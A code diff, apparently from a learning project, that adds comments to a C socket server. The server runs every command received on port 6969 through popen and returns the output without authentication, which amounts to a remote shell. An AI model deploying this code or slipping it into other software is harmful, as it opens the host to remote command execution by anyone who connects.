@@ -4,32 +4,34 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-#include <sys/types.h>
+#include <sys/types.h>		// types for the sockets
 
 #define SERVER_PORT 6969
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 1024		// size depends on send/receive. Same as client
 
+// We are communicating with client. This is where that gets handeled.
 void handle_client(int client_sock) {
-    char buffer[BUFFER_SIZE];
+    char buffer[BUFFER_SIZE];		// declare buffer at given size
     int bytes_received;
 
     while((bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
         buffer[bytes_received] = '\0';  // null termination
         printf("Received command: %s", buffer);
 
-        FILE *fp = popen(buffer, "r");
-        if (fp == NULL) {
+        FILE *fp = popen(buffer, "r");		// same POSIX magic as client. Executes the received command as shell a
+											// shell command. Read only
+        if (fp == NULL) {		// check if fail
             send(client_sock, "Failed to execute command\n", strlen("Failed to execute command\n"), 0);
             continue;
         }
 
-        memset(buffer, 0, BUFFER_SIZE);
+        memset(buffer, 0, BUFFER_SIZE);		// clear before reading
         size_t bytes_read;
-        while ((bytes_read = fread(buffer, 1, BUFFER_SIZE - 1, fp)) > 0) {
-            send(client_sock, buffer, bytes_read, 0);
-            memset(buffer, 0, BUFFER_SIZE);
+        while ((bytes_read = fread(buffer, 1, BUFFER_SIZE - 1, fp)) > 0) {		// read the output of the command
+            send(client_sock, buffer, bytes_read, 0);		// send
+            memset(buffer, 0, BUFFER_SIZE);					// clear after send
         }
-        pclose(fp);
+        pclose(fp);		// close pointer file created by popen
     }
 
     if (bytes_received == 0) {
